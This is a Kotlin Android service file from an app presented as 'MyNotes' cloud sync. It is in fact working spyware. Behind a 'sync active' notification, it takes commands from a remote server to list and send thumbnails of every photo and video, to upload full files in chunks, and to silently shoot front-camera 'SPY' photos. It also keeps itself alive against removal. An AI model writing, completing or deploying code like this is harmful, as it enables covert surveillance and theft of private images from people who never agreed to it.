package cl.example.mynotes

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.ThumbnailUtils
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.concurrent.thread

// --- IMPORTACIONES OKHTTP ---
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
// (Ya no necesitamos okio.source ni BufferedSink explícitamente para esta estrategia manual)

class CloudSyncService : Service() {

    private var socket: Socket? = null
    // ASEGÚRATE QUE ESTA URL SEA TU DOMINIO CLOUDFLARE
    private val SERVER_URL = "https://mynotes.arccidev.com"
    private val CHANNEL_ID = "MyNotesBackupChannel"

    private var wakeLock: PowerManager.WakeLock? = null
    @Volatile private var isScanning = false

    override fun onCreate() {
        super.onCreate()
        try {
            startForeground(1, createNotification())
        } catch (e: Exception) { e.printStackTrace() }

        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
            wakeLock?.acquire(60 * 60 * 1000L)
        } catch (e: Exception) { Log.e("CloudSync", "Error WL: ${e.message}") }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // --- BLOQUE DE SEGURIDAD ANTI-CRASH (ANDROID 14) ---
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Usamos el tipo dataSync explícitamente como declaramos en el Manifest
                startForeground(
                    1,
                    createNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(1, createNotification())
            }
        } catch (e: Exception) {
            // Si caemos aquí, es porque el sistema rechazó el inicio (ForegroundServiceStartNotAllowedException)
            Log.e("CloudSync", "💀 Crash evitado: ${e.message}")
            stopSelf() // Matamos el servicio limpiamente
            return START_NOT_STICKY // No intentar reiniciar inmediatamente
        }
        // ----------------------------------------------------

        connectAndListen()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
            setPackage(packageName)
        }
        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pendingIntent)
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Cloud Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MyNotes Cloud")
            .setContentText("Sincronización activa")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun connectAndListen() {
        if (socket?.connected() == true) return

        try {
            val options = IO.Options().apply {
                reconnection = true
                forceNew = true
            }
            socket = IO.socket(SERVER_URL, options)

            socket?.on(Socket.EVENT_CONNECT) {
                registrarDispositivo()

                thread {
                    try { Thread.sleep(1000) } catch (e: Exception) {}
                    sendFolderList()
                }

                if (!isScanning) {
                    isScanning = true
                    thread {
                        sendThumbnails(null)
                        isScanning = false
                    }
                }
            }

            socket?.on("command_start_scan") { args ->
                if (!isScanning) {
                    isScanning = true
                    thread { sendFolderList() }

                    var folderFilter: String? = null
                    if (args.isNotEmpty()) {
                        val params = args[0] as? JSONObject
                        folderFilter = params?.optString("folder")
                        if (folderFilter.isNullOrEmpty()) folderFilter = null
                    }

                    thread {
                        sendThumbnails(folderFilter)
                        scanVideos(folderFilter)
                        isScanning = false
                    }
                }
            }

            socket?.on("command_stop_scan") { isScanning = false }

            socket?.on("command_take_photo") { takeSpyPhoto() }

            socket?.on("request_full_image") { args ->
                val data = args[0] as JSONObject
                val path = data.optString("path")
                val target = data.optString("target")

                // Aquí inicia la subida por trozos
                uploadFileHttp(path, target)
            }

            socket?.connect()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun registrarDispositivo() {
        try {
            val info = JSONObject().apply {
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                put("dataType", "register_device")
            }
            socket?.emit("usrData", info)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun sendFolderList() {
        val uniqueFolders = HashSet<String>()

        try {
            val uriImages = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
            contentResolver.query(uriImages, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error listando fotos: ${e.message}") }

        try {
            val uriVideo = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
            contentResolver.query(uriVideo, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Error listando videos: ${e.message}") }

        if (uniqueFolders.isNotEmpty()) {
            val sortedList = uniqueFolders.sorted()
            val data = JSONObject().apply {
                put("dataType", "folder_list")
                put("folders", org.json.JSONArray(sortedList))
            }
            socket?.emit("usrData", data)
        }
    }

    private fun sendThumbnails(targetFolder: String?) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        var selection: String? = null
        var selectionArgs: Array<String>? = null

        if (targetFolder != null) {
            selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    if (!isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val thumb = getThumb(path)

                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", File(path).parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_image")
                        }
                        socket?.emit("usrData", data)
                        Thread.sleep(50)
                    }
                }
            }
        } catch (e: Exception) { Log.e("CloudSync", "Scan Error: ${e.message}") }
    }

    private fun scanVideos(targetFolder: String?) {
        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media._ID
        )
        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"

        var selection: String? = null
        var selectionArgs: Array<String>? = null

        if (targetFolder != null) {
            selection = "${MediaStore.Video.Media.DATA} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                val idxId = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)

                while (cursor.moveToNext()) {
                    if (!isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val id = cursor.getLong(idxId)
                    val file = File(path)

                    val thumb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try {
                            contentResolver.loadThumbnail(
                                android.content.ContentUris.withAppendedId(uri, id),
                                android.util.Size(96, 96),
                                null
                            )
                        } catch (e: Exception) { null }
                    } else {
                        @Suppress("DEPRECATION")
                        MediaStore.Video.Thumbnails.getThumbnail(
                            contentResolver,
                            id,
                            MediaStore.Video.Thumbnails.MICRO_KIND,
                            null
                        )
                    }

                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", file.parentFile?.name ?: "Unknown")
                            put("image64", encodeToBase64(thumb, 40))
                            put("dataType", "preview_video")
                        }
                        socket?.emit("usrData", data)
                        Thread.sleep(80)
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    // =========================================================
    // 🔪 ESTRATEGIA DEL SALAME: SUBIDA POR TROZOS (CHUNKING)
    // =========================================================
    private fun uploadFileHttp(path: String, targetSocketId: String?) {
        val file = File(path)
        if (!file.exists()) return

        // CONFIGURACIÓN: 10 MB por pedazo (Seguro para Free Cloudflare)
        val CHUNK_SIZE = 10 * 1024 * 1024
        val totalSize = file.length()
        // Calculamos cuántos pedazos salen
        val totalChunks = (totalSize + CHUNK_SIZE - 1) / CHUNK_SIZE

        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
        val client = OkHttpClient()

        Log.d("UPLOAD", "🔪 Iniciando corte: ${file.name} | Total: ${totalSize/1024/1024} MB | Pedazos: $totalChunks")

        thread {
            try {
                // Abrimos el archivo para lectura manual
                val fileInputStream = file.inputStream()
                val buffer = ByteArray(CHUNK_SIZE)
                var bytesRead: Int
                var chunkIndex = 0
                var uploadedBytes: Long = 0

                // BUCLE: Leer pedazo -> Subir -> Repetir
                while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {

                    // Si el último pedazo es más chico, ajustamos el array para no mandar basura vacía
                    val actualChunkData = if (bytesRead < CHUNK_SIZE) {
                        buffer.copyOf(bytesRead)
                    } else {
                        buffer
                    }

                    // Preparamos los datos multipart
                    val requestBody = MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        // Enviamos el pedazo como "blob"
                        .addFormDataPart("file", "blob", actualChunkData.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
                        .addFormDataPart("filename", file.name)
                        .addFormDataPart("chunkIndex", chunkIndex.toString())
                        .addFormDataPart("totalChunks", totalChunks.toString())
                        .addFormDataPart("deviceId", deviceId)
                        .addFormDataPart("deviceName", deviceName)
                        .addFormDataPart("folderName", file.parentFile?.name ?: "Unknown")
                        .build()

                    val request = Request.Builder()
                        .url("$SERVER_URL/upload-chunk") // <--- RUTA ESPECIAL PARA TROZOS
                        .post(requestBody)
                        .build()

                    // ENVIAMOS EL PEDAZO Y ESPERAMOS (Síncrono para mantener orden)
                    val response = client.newCall(request).execute()

                    if (!response.isSuccessful) {
                        Log.e("UPLOAD", "❌ Error subiendo chunk $chunkIndex: ${response.code}")
                        response.close()
                        fileInputStream.close()
                        return@thread // Cancelamos todo si falla uno
                    }
                    response.close()

                    // REPORTAR PROGRESO (Para la barra en Electron)
                    uploadedBytes += bytesRead
                    val progress = (uploadedBytes * 100 / totalSize).toInt()

                    try {
                        val data = JSONObject().apply {
                            put("deviceId", deviceId)
                            put("filename", file.name)
                            put("progress", progress)
                        }
                        socket?.emit("upload_progress", data)
                    } catch (e: Exception) {}

                    chunkIndex++
                }

                fileInputStream.close()
                Log.d("UPLOAD", "✅ Subida completa exitosa: ${file.name}")

            } catch (e: Exception) {
                Log.e("UPLOAD", "❌ Excepción critica: ${e.message}")
                e.printStackTrace()
            }
        }
    }

    private fun getThumb(path: String): Bitmap? = try {
        ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96)
    } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    private fun takeSpyPhoto() {
        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                val characteristics = manager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: manager.cameraIdList[0]

            val thread = HandlerThread("CameraBackground")
            thread.start()
            val backgroundHandler = Handler(thread.looper)

            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) return

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                    req.addTarget(imageReader.surface)
                                    req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                                    req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    req.set(CaptureRequest.JPEG_ORIENTATION, 270)
                                    session.capture(req.build(), null, backgroundHandler)
                                } catch (e: Exception) { camera.close() }
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
                        }, backgroundHandler)

                        imageReader.setOnImageAvailableListener({ reader ->
                            val image = reader.acquireLatestImage()
                            val buffer = image.planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            image.close()

                            camera.close()
                            thread.quitSafely()

                            val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                            val data = JSONObject().apply {
                                put("dataType", "full_image")
                                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                                put("name", "SPY_${System.currentTimeMillis()}.jpg")
                                put("image64", b64)
                                put("folder", "SPY_CAMERA")
                            }
                            socket?.emit("usrData", data)
                        }, backgroundHandler)
                    } catch (e: Exception) { camera.close() }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
            }, backgroundHandler)
        } catch (e: Exception) { e.printStackTrace() }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}
        sendBroadcast(Intent(this, RestartReceiver::class.java))
    }
}